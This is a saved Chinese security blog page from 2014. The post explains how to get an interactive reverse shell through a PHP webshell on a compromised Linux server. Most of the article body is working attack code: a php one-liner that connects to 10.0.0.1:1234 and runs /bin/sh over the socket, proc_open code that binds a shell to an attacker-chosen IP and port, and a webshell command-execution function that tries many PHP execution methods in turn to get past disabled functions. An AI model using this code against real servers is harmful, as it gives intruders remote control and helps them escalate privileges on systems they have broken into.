@@ -1,0 +1,305 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>php webshell下直接反弹shell（不借助任何其他语言） | 离别歌</title>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/styles.css" rel="stylesheet"/>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/style.css" rel="stylesheet"/>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/jquery.min.js"></script>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/code.css" rel="stylesheet"/>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/button.css" rel="stylesheet"/>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PHP/backshell-via-php.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PHP/backshell-via-php.html&amp;text=php%20webshell%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%8D%E5%80%9F%E5%8A%A9%E4%BB%BB%E4%BD%95%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%EF%BC%89"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PHP/backshell-via-php.html&amp;title=php%20webshell%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%8D%E5%80%9F%E5%8A%A9%E4%BB%BB%E4%BD%95%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%EF%BC%89"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PHP/backshell-via-php.html&amp;is_video=false&amp;description=php%20webshell%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%8D%E5%80%9F%E5%8A%A9%E4%BB%BB%E4%BD%95%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%EF%BC%89"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=php%20webshell%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%8D%E5%80%9F%E5%8A%A9%E4%BB%BB%E4%BD%95%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%EF%BC%89&amp;body=Check out this article: https%3A//www.leavesongs.com/PHP/backshell-via-php.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PHP/backshell-via-php.html&amp;title=php%20webshell%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%8D%E5%80%9F%E5%8A%A9%E4%BB%BB%E4%BD%95%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%EF%BC%89"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PHP/backshell-via-php.html&amp;title=php%20webshell%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%8D%E5%80%9F%E5%8A%A9%E4%BB%BB%E4%BD%95%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%EF%BC%89"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PHP/backshell-via-php.html&amp;title=php%20webshell%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%8D%E5%80%9F%E5%8A%A9%E4%BB%BB%E4%BD%95%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%EF%BC%89"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PHP/backshell-via-php.html&amp;title=php%20webshell%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%8D%E5%80%9F%E5%8A%A9%E4%BB%BB%E4%BD%95%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%EF%BC%89"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PHP/backshell-via-php.html&amp;name=php%20webshell%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%8D%E5%80%9F%E5%8A%A9%E4%BB%BB%E4%BD%95%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%EF%BC%89&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">php webshell下直接反弹shell（不借助任何其他语言）</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年10月27日 18:43" itemprop="datePublished">
+                    2014 十月 27 18:43
+                </time>
+</div>
+<div class="article-tag">
+            阅读：5905
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PHP">PHP</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E5%8F%8D%E5%BC%B9shell">反弹shell</a>,
+                
+                <a class="tag-link" href="/tag/webshell">webshell</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+	    linux下，有时候拿到webshell需要提权，提权必须要得到一个交互式的shell。
+</p>
+<p>
+	    我看了一下常用的php webshell，对于命令执行、反弹shell都没有完善的方式。很多webshell里都没有proc_popen、popen这两种方式，特别是proc_popen，比如phpspy。
+</p>
+<p>
+	    在我收集的反弹shell集合（<a href="http://tool.p1ng.pw/getshell.html" target="_blank">http://tool.p1ng.pw/getshell.html</a>）中，有一个方法，就是在命令行中输入：
+</p>
+<pre class="brush: php;auto-links: false;">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
+    但是有个问题，如果在webshell里执行如上代码的话，会把系统的标准输入输出重定向到/bin/sh里，导致php-fpm直接502，然后弹的shell也会瞬间掉了，这个方式比较粗鲁。而我的思路是：我只希望把我新创建的进程(/bin/sh)的标准输入输出重定向到socket中，不去动系统的东西。
+<p>
+<br>
+</br></p>
+<p>
+	    当系统没有禁用proc_popen的时候，我们是可以借助proc_popen轻松反弹这样的一个shell的。不需要任何其他语言的支持，php足矣。
+</p>
+<pre class="brush: as3;auto-links: false;">$sock = fsockopen($ip, $port);
+$descriptorspec = array(
+        0 =&gt; $sock,
+        1 =&gt; $sock,
+        2 =&gt; $sock
+);
+$process = proc_open('/bin/sh', $descriptorspec, $pipes);
+proc_close($process);</pre>
+    其中$ip是反弹的ip，$port是反弹的端口，这也是我个人版webshell里一个小功能：
+<p>
+<br>
+</br></p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201410/93711414410765.jpg" id="ematt:636" target="_blank"><img alt="38.jpg" border="0" height="141" src="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/thum-93711414410765.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+	    反弹shell的时候web页面会卡死，因为php没有异步的函数，默认也不支持多线程，所以卡住这个现象很正常，不影响反弹shell。
+</p>
+<p>
+	    不过我试了，在windows下似乎不能完美运行。不知道是我环境问题（杀毒软件等）还是代码问题。silic的大马中有一个windows反弹的功能，windows下可以使用：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201410/cd0d1414409849.jpg" id="ematt:635" target="_blank"><img alt="39.jpg" border="0" height="236" src="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/cd0d1414409849.jpg" title="点击查看原图" width="639"/></a>
+</p>
+<p>
+	    具体代码请自行到silic webshell中查看。我没有试过，不知道成功率怎么样。
+</p>
+<p>
+<br/>
+</p>
+<p>
+	    另附我的webshell中执行命令的函数，各位看官自行修改后可以使用。有可以补充的，欢迎告诉我呀~
+<pre class="brush: php;auto-links: false;">function exec_comm($cmd, &amp;$type = '', &amp;$suc = TRUE)
+{
+    set_error_handler("customError");
+    $re = false;
+    if (empty($cmd))  return '执行结果';
+    if (empty($type)){
+        if(function_exists('exec')){
+            @exec($cmd, $re);
+            $re = join("\n", $re);
+            $type = 'exec';
+        }else if(function_exists('shell_exec') &amp;&amp; ($re = shell_exec($cmd))){
+            $type = 'shell_exec';
+        }else if(function_exists('system')){
+            @ob_start();system($cmd);$re=@get_ob_contents();@ob_end_clean();
+            $type = 'system';
+        }else if(function_exists('passthru')){
+            @ob_start();passthru($cmd);$re=@get_ob_contents();@ob_end_clean();
+            $type = 'passthru';
+        }else if(is_resource($f = popen($cmd,"r"))){
+            while(!@feof($f)){$re .= @fread($f,1024);}@pclose($f);
+            $type = 'popen';
+        }else if(function_exists('proc_open')){
+            $descriptorspec = array(
+                0 =&gt; array("pipe", "r"),
+                1 =&gt; array("pipe", "w"),
+                2 =&gt; array("pipe", "w")
+             );
+            $process = proc_open($cmd, $descriptorspec, $pipes);
+            if (is_resource($process)) {
+                fwrite($pipes[0], "{$cmd}\r\n");
+                fwrite($pipes[0], "exit\r\n");
+                fclose($pipes[0]);
+                // 读取输出
+                while (!feof($pipes[1])) {
+                    $re .= fgets($pipes[1], 1024);
+                }
+                fclose($pipes[1]);
+                while (!feof($pipes[2])) {
+                    $re .= fgets($pipes[2], 1024);
+                  }
+                fclose($pipes[2]);
+                proc_close($process);
+            }
+        }
+    }else if($type == 'wscript'){
+        $s= new COM('wscript.shell');
+        $exec = $s-&gt;exec($cmd);
+        $stdout = $exec-&gt;StdOut();
+        $re = $stdout-&gt;ReadAll();
+    }else if($type == 'application'){
+        $exe = gpc('exe', 'post', 'c:/windows/system32/cmd.exe');
+        $shell= new COM('Shell.Application');
+        $shell-&gt;ShellExecute($exe,$cmd);
+        $re = "请查看{$cmd}中输入文件内容\n";
+    }
+    if ($re === false){ $re = '命令执行可能失败，可能是执行函数被禁用或执行无回显'; $suc = FALSE;}
+    return $re;
+}</pre>
+</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2469">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">a</a>
+<time datetime="2016年11月3日 20:53" itemprop="datePublished">
+                            2016 十一月 03 20:53
+                        </time>
+<a href="javascript:reply_to('2469', 'a')">回复</a>
+</p>
+<p class="comment-meta">/bin/sh 是linux 下的环境。 windows下是反弹的cmd回来 应该是这个原因无法执行把</p>
+</div>
+</div>
+<div class="row" id="comment-2176">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/eb89d0f7366b03ed0417b0ae54c5501d.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">jiawei</a>
+<time datetime="2015年7月26日 22:47" itemprop="datePublished">
+                            2015 七月 26 22:47
+                        </time>
+<a href="javascript:reply_to('2176', 'jiawei')">回复</a>
+</p>
+<p class="comment-meta">想请问下大牛，php写安全相关的代码，比如漏洞利用代码这些该怎么学啊，有木有先关书籍可以看看的，接触php快一年了，一点这方面的积累都没有。</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="0bf6bddbc094265af3f4080f281d86447fc0610e"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/0bf6bddbc094265af3f4080f281d86447fc0610e"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="331">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="UHKAcH5ypcRwKr7EkZmjoQl2xYYJSRjls1560bhNQZLVK6vT8gQ3Xun7G2rRBl8v"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./php webshell下直接反弹shell（不借助任何其他语言）  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
